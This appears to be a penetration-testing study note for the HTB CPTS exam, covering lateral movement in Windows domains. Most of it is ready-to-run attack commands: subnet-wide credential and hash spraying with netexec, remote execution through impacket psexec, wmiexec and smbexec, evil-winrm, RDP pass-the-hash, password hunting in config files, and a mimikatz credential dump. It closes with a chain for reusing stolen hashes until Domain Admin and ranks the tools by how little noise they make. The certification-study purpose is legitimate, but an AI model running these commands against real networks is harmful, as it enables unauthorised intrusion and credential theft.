# 14 — Lateral Movement

## Check Where You Have Access First

```bash
nxc smb <subnet>/24 -u user -p pass                  # green "Pwn3d!" = local admin somewhere
nxc smb <subnet>/24 -u user -H <hash>
```

## Remote Execution Methods (once you have admin/valid creds on a host)

```bash
# PsExec-style (drops a service, needs admin share access)
impacket-psexec user:pass@<IP>
impacket-psexec -hashes :<NTLM> user@<IP>

# WMI-based (quieter than psexec, no service creation)
impacket-wmiexec user:pass@<IP>

# SMB-based (uses named pipes, no new process visible as easily)
impacket-smbexec user:pass@<IP>

# WinRM (if 5985 open, uses PowerShell remoting — very common and easy)
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -H <NTLM_hash>

# Native PowerShell remoting (from a Windows box you already own)
Enter-PSSession -ComputerName <host> -Credential $cred
```

**Order of preference for CPTS:** try WinRM (evil-winrm) first if 5985 is open — cleanest UX, file upload/download built in. Fall back to `wmiexec` (quieter, no AV-triggering service) then `psexec` (works reliably but drops a service + noisier).

## RDP Lateral Movement

```bash
xfreerdp /u:user /p:pass /v:<IP> /dynamic-resolution
xfreerdp /u:user /pth:<NTLM_hash> /v:<IP>    # pass-the-hash over RDP (needs Restricted Admin mode enabled)
```

## Evil-WinRM Useful Features

```bash
evil-winrm -i <IP> -u user -p pass -e /path/to/exe_dir   # load .exe/ps1 as menu commands
# In session:
upload local.txt C:\Users\Public\local.txt
download C:\loot\file.txt
menu               # lists loaded PS scripts
```

## Loot Hunting After Landing On Each New Host

```powershell
# Check for saved creds, browser passwords, PuTTY sessions, unattend.xml
findstr /si password *.xml *.ini *.txt *.config
dir /s /b unattend.xml sysprep.inf sysprep.xml
# Mimikatz for cached logons of other users
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## Pass Loot Onward — The Chain

Every host you land on: dump hashes/tickets (`secretsdump`, `mimikatz`) → try those creds on every other discovered host (`nxc smb <subnet>/24 -u user -H hash`) → repeat until Domain Admin or objective reached.

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| Remote shell (WinRM open) | psexec by default | `evil-winrm` — cleaner, has upload/download built-in |
| Quiet execution (avoid service creation) | psexec | `wmiexec.py` |
| Mass credential testing across subnet | one host at a time | `nxc smb <subnet>/24 -u user -H hash` for the whole range at once |

Next: `15-pivoting-tunneling.md`
